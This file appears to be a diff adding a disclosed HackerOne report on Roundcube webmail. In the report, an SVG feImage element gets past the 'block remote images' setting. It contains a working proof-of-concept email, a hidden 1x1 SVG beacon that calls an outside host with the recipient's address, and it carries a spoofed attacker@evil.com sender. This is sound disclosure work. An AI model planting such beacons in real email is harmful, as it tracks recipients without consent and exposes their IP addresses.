@@ -1,0 +1,145 @@
+{
+  "id": 3486747,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDg2NzQ3",
+  "url": "https://hackerone.com/reports/3486747",
+  "title": "SVG filter primitives bypass remote image blocking, enabling email tracking without consent.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-01-04T18:34:28.554Z",
+  "submitted_at": "2026-01-04T18:34:29.417Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nullcathedral",
+    "url": "/nullcathedral",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0msiosnihxn702obxntp2gl96eid/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-04-20T12:57:06.179Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-03-21T12:56:49.020Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nWhen `allow_remote` is set to `false`, Roundcube's HTML sanitizer [https://github.com/roundcube/roundcubemail/blob/5162a0d9d7b05728500375611a2fb4fc55844c7c/program/lib/Roundcube/rcube_washtml.php](rcube_washtml) blocks external resources in `<img>`, `<image>`, and `<use>` tags by checking their src/href attributes through `is_image_attribute()`.\n\nHowever, the `<feImage>` SVG filter primitive is allowlisted as an element but its href attribute is not recognized as an image source. Instead, it passes through `wash_link()` which permits external HTTP/HTTPS URLs.\n\n## Steps To Reproduce:\n\nStep 1: Send an HTML e-mail with embedded SVG \n\n```\n<!DOCTYPE html>\n<html>\n<head><title>Important Document</title></head>\n<body>\n<h1>Important Information</h1>\n<p>Dear valued customer,</p>\n<p>Please review the attached information carefully.</p>\n\n<svg width=\"1\" height=\"1\" style=\"position:absolute;left:-9999px;\">\n  <defs>\n    <filter id=\"t\">\n      <feImage href=\"https://httpbin.org/image/svg?email=victim@test.com\" width=\"1\" height=\"1\"/>\n    </filter>\n  </defs>\n  <rect filter=\"url(#t)\" width=\"1\" height=\"1\"/>\n</svg>\n\n<p>Best regards,<br>Totally Legitimate Company</p>\n\n</body>\n</html>\n```\n\nStep 2: See HTTP request made to `https://httpbin.org/image/svg?email=victim@test.com` when the e-mail is opened\n\n## Supporting Material/References:\n\n{F5185346}\n\n### Show Source\n\n```\nReturn-Path: <attacker@evil.com>\nReceived: from xxx\nContent-Type: multipart/alternative; boundary=\"===============5782437078710662677==\"\nMIME-Version: 1.0\nSubject: Important: Please Review This Document\nFrom: attacker@evil.com\nTo: victim@test.com\n\n--===============5782437078710662677==\nContent-Type: text/plain; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\nPlease enable HTML to view this message.\n--===============5782437078710662677==\nContent-Type: text/html; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n<!DOCTYPE html>\n<html>\n<head><title>Important Document</title></head>\n<body>\n<h1>Important Information</h1>\n<p>Dear valued customer,</p>\n<p>Please review the attached information carefully.</p>\n\n<svg width=\"1\" height=\"1\" style=\"position:absolute;left:-9999px;\">\n  <defs>\n    <filter id=\"t\">\n      <feImage href=\"https://httpbin.org/image/svg?email=victim@test.com\" width=\"1\" height=\"1\"/>\n    </filter>\n  </defs>\n  <rect filter=\"url(#t)\" width=\"1\" height=\"1\"/>\n</svg>\n\n<p>Best regards,<br>Totally Legitimate Company</p>\n\n</body>\n</html>\n\n--===============5782437078710662677==--\n```\n\n## Impact\n\nAttackers can embed invisible tracking pixels in emails that load even when \"Block remote images\" is enabled, allowing:\n\n1. Email open tracking / read receipts without consent\n2. IP address disclosure (Geolocation inference)\n3. User agent fingerprinting",
+  "weakness": {
+    "id": 46,
+    "name": "Privacy Violation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5185346,
+      "file_name": "Screenshot_2026-01-04_at_19.20.01.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6y7fuva437utyn8kx08y0zmg48qc?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-01-04_at_19.20.01.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-01-04_at_19.20.01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4JRL4PGN%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T141951Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCKhTVYP9dxDOYqH7kx4sod2%2BmF9abht0pHf0hKpQ5pvgIhAMkwyTWY95rlgIVSiQlfIiC47jl1fiGIgwuVIKitNWyhKroFCLX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz6BAm%2BDE8DmT7lamkqjgWbvWmOZIE7Pdc6UifI80Hfqnm7Tsdy%2BdqEiHTG8YKTu73yt3uTWSwkohnTklaQeL5EyJjuWglUod6KH2w4gApM%2FeFoVyWJgkeSEEwxo%2FJdkfBGYHDYCWnSUMM5w%2FqV6N%2F51Tw%2FL%2ByyWWO79E9RIi94fiOEzFBAxCd1pOGoUmwhYDZbULw3h2bWPnjSenVhePQdhSdIQP2VRZsP%2BW3e4ZovuXEY3fkFFfAK1SrhOMbOe%2F7WoYvZjhpJ0kZGCWQj0PjZpfBWLlGtJUW%2F8RGKuFVwn8CIAdZO%2BlMw3B16xqa32PLsCLXCuFU25Xh%2Bew%2BTjE4OVGuYqXUlHZSDVA7KzRw6ne2xwN5bnFU1amixNmDm%2BEeUzqH3nLUuf4%2BOu30H55Oxlux3lIosZWXK9nvt%2FSn7vugNZzEW54e1uCD9TLob07PFqc5odDdyr7755X7FDHi5dULYvZDdtr2odsh%2FI21rC8CP5bUee%2B4b7Ms1mOtCsQeu8MvqARSTBzGZ%2FDnI7pgeiyvDgP4qidGHafG9ZUVCbqI8DIJ%2BVjQz05%2BJaUXV8o3%2BSKDxfoDc5titQ%2Fi0g1hl1wXm8Ac4B8l9RwkHmBIAXroKVvQSCVYEUqal2OTcJEEjQdE%2BK18c3mhzcBJMSm9CwMtzJAVOOHB6wNs%2FwLvxuil5cge%2F1hYVU%2BGpJ%2F2mVbvvpIvR%2BZ4R9INO1e%2BLyZhc%2FP7oGYIw61GNeJL8SVyyYPpIK8wqvStZSuRQUcBchQnQb5%2B6vfcvF8yYSYIdpvV6wbQ%2FzBhuoVh%2Bm9f9%2FrWHTRZKS0dZWFf0Z4t%2FpatMK10iKz3%2BCsDIsCSdaWbjfeVTvAMoCIUQ9EUHwBW3dP2cQZ7MNTsrXKeFN4QYJvcwhuCa0QY6sAENt2OSIHDS%2FEV3jc3p08X0jCVNeaxNG0RLJ1xIwAtOhdVz1cZRoaKZNlLx6hSrnH0cUtHPP%2Fd47MIERyAImerIm2gidJ3YcvSdA6A2fN5PdjiP6FH6t%2BtdkBQoZVrIzWmNxgaGZFVvf3dksn0isB5epnvNV7ra6Ag8wpeXyHf3TqGbjXaEkOJoDj9cbVtHY381u%2BqHdA3ajnvmHNgrH9maMW3LqMXYP1B1O6aleiBQXA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0599197ea102c7a8eea9788445830f195f1d5aa1e0e1648655df6bbcb7390cfb",
+      "file_size": 468206,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-04-20T12:56:49.498Z",
+  "allow_singular_disclosure_after": -4238581.890073276,
+  "singular_disclosure_allowed": true,
+  "vote_count": 53,
+  "voters": [
+    "ganeshbagaria",
+    "bl4de",
+    "mohaned0101",
+    "2026",
+    "kingsmanbuggy",
+    "johancarloss",
+    "vishnumadhavan",
+    "nwicks",
+    "victor10",
+    "kratohack",
+    "and 43 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 565457,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/roundcube/roundcubemail",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
